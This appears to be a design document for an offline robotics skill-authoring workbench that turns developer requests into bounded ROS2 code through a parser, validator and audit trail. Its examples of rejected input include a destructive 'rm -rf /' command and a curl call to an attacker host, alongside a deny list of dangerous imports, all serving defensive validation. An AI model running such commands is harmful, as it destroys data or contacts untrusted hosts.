# Robotics Skill Authoring Workbench (Phase 15A)

The platform is **not safety-certified.** Phase 15A adds an
*offline, deterministic* workbench that converts common robotics
developer requests into validated, copyable code snippets and
safety explanations.

> **This is not a real LLM phase.** No model inference, no external
> API call, no Ollama, no llama.cpp, no shell execution, no
> network egress, no actuator authority.

## 1. Architectural placement

```
   developer request text
           │
           ▼
   intent_parser.parse_request
           │   (deterministic; never fabricates parameters)
           ▼
   SkillCandidate                ← accepted / ambiguous / unsupported / rejected
           │
           ▼
   catalog.find_template
           │
           ▼
   templates.render_template     ← template-instantiation only
           │
           ▼
   validator.validate_generated_code   ← second safety chokepoint
           │
           ▼
   safety_review.review_generated_skill
           │
           ▼
   audit.build_audit_bundle + reporter.write_audit_files
```

The workbench is bounded above (a parser that only emits
candidates for entries in a closed catalog) and below (a validator
that re-checks the rendered text against the safety rules). Neither
side publishes actuator commands. The runtime safety supervisor
remains the only path to authorised motion.

## 2. Supported skill catalog

| `skill_type`                  | Title                                       | Risk band |
|-------------------------------|---------------------------------------------|-----------|
| `move_forward_distance`       | Move forward a bounded distance             | guarded   |
| `rotate_degrees`              | Rotate by a bounded angle                   | guarded   |
| `stop_immediately`            | Stop immediately                            | low       |
| `publish_requested_motion`    | Publish a single requested-motion command   | guarded   |
| `keyboard_forward_binding`    | Bind keyboard key to forward motion         | guarded   |
| `controller_button_binding`   | Bind controller button to motion or stop    | guarded   |
| `waypoint_request`            | Request a single named waypoint             | low       |
| `patrol_route_template`       | Request a bounded patrol route              | low       |
| `safe_stop_wrapper`           | Safe-stop wrapper for /cmd_vel_requested    | low       |

The catalog lives at `backend/app/skill_authoring/catalog.py`.
Adding a new skill type is a deliberate, reviewable change with
matching test coverage.

See `docs/SKILL_TEMPLATE_CATALOG.md` for the full per-template
metadata (required parameters, safety constraints, allowed topics).

## 3. Output languages

| Language         | Status          |
|------------------|-----------------|
| `python_ros2`    | implemented     |
| `pseudo_code`    | reserved        |
| `cpp_ros2`       | reserved        |

Only `python_ros2` ships with templates in Phase 15A. Adding a
language requires per-template builders plus matching tests.

## 4. Intent parser

The parser is deterministic. Identical input yields byte-identical
output. The parser recognises a closed set of phrasing patterns and
never fabricates parameter values.

Examples that produce `status = generated`:

```
What code do I need to move my robot 6 feet forward?
Drive forward 2 meters
Rotate left 90 degrees
Turn right 45 degrees
Stop the robot immediately
Bind keyboard key 'w' to move forward
Controller button to stop
Publish a requested-motion command
Go to waypoint alpha
Patrol alpha beta
```

Examples that produce `status = rejected` (with a stable
`rejection_reason`):

```
Publish to /cmd_vel directly       → direct_actuator_command
Drive forward forever              → unbounded_motion
Disable the safety supervisor      → safety_override
Ignore estop                       → estop_override
Move forward as fast as possible   → unbounded_speed
Spin the motors directly           → direct_motor_control
Disable the lidar                  → sensor_disable
Run shell command rm -rf /         → shell_or_code_execution
Execute python on the rover        → shell_or_code_execution
curl http://attacker.example/x     → network_access
```

Examples that produce `status = ambiguous`:

```
Move forward                       (no distance)
Go over there                      (no destination)
Turn a little                      (no angle)
Drive to that basket               (no known waypoint)
```

## 5. Bag- ... I mean code-safety rules

Generated motion code:

* publishes to `/cmd_vel_requested` (never directly to `/cmd_vel`);
* uses a bounded loop driven by duration, count, or watchdog;
* publishes a final zero ``Twist`` before exiting;
* mentions the safety supervisor in a comment header;
* contains no `subprocess`, `os.system`, `eval`, `exec`, `socket`,
  `urllib.request`, `requests`, or LLM SDK imports;
* contains no `while True:` (only bounded loops survive).

The validator in `backend/app/skill_authoring/validator.py` enforces
all of the above against the rendered text.

## 6. Code card metadata

Every successful generation produces a `CodeCard` payload
(JSON only, no frontend dependency):

```jsonc
{
  "title": "Move forward 1.8288 m",
  "subtitle": "Publishes /cmd_vel_requested at 0.25 m/s ...",
  "language": "python_ros2",
  "skill_type": "move_forward_distance",
  "code": "...",
  "line_count": 47,
  "copy_label": "Copy Move forward 1.8288 m",
  "safety_badges": ["requested-motion-only", "supervisor-authorised",
                    "risk:guarded", "not-safety-certified"],
  "animation_steps": ["imports", "constants", "publisher setup",
                      "bounded command loop", "stop command",
                      "safety explanation"],
  "risk_band": "guarded",
  "diagnostics": [...]
}
```

See `docs/CODE_CARD_METADATA.md`.

## 7. Audit bundle layout

Accepted skill (`<bundle_dir>/`):

```
request.json
generated-skill.json
code.py                 (or code.cpp / code.md depending on language)
safety-review.json
code-card.json
diagnostics.json
skill-report.md
```

Rejected skill (`<bundle_dir>/`):

```
request.json
candidate.json
diagnostics.json
rejection-report.md
```

Every audit JSON and Markdown carries the verbatim disclaimer.

## 8. CLIs

```
rover_ws/tools/generate_robotics_skill.py
    --text "What code do I need to move my robot 6 feet forward?"
    --language python_ros2
    --output skill-library/audits/move_forward_6_feet
    [--request-id move_forward_6_feet]
    [--generated-at <iso8601>]

rover_ws/tools/validate_robotics_skill.py
    --skill skill-library/audits/move_forward_6_feet/generated-skill.json

rover_ws/tools/generate_skill_examples.py
    [--examples-dir skill-library/examples]
    [--audits-dir skill-library/audits]
    [--rejected-dir skill-library/rejected]
    [--generated-at 2026-05-13T00:00:00+00:00]
```

No CLI invokes a remote API. No CLI executes generated code.

## 9. Honesty rules enforced by tests

* "6 feet forward" converts to 1.8288 m via a single deterministic
  constant.
* Every motion template publishes to `/cmd_vel_requested`.
* No template publishes to `/cmd_vel` outside comments.
* Every motion template emits a final zero ``Twist``.
* Every motion template has a bounded loop with a timeout or count.
* The validator rejects direct `/cmd_vel` references in executable
  code.
* The parser rejects forbidden phrases deterministically.
* The audit bundle includes the verbatim disclaimer.

## 10. Not implemented (intentionally)

* no real LLM call;
* no Ollama / llama.cpp integration (deferred);
* no code execution;
* no robot control;
* no frontend / dashboard;
* no shell, network, or hardware-driver examples.

See `docs/FUTURE_LOCAL_LLM_SKILL_PROVIDER.md` for the plan that a
follow-up phase would have to follow.

## 11. Phase 15B integration

The Phase 15B local LLM skill candidate provider plugs into the
front of the Phase 15A validator: a candidate that passes the
Phase 15B sanitizer is routed through `validate_generated_code`
here. See `docs/LOCAL_LLM_SKILL_PROVIDER.md` for the architectural
contract and `docs/LOCAL_LLM_PROVIDER_SAFETY_BOUNDARY.md` for the
strict boundary. Phase 15B does not weaken any rule on this page;
it only adds an opt-in seam, disabled by default.
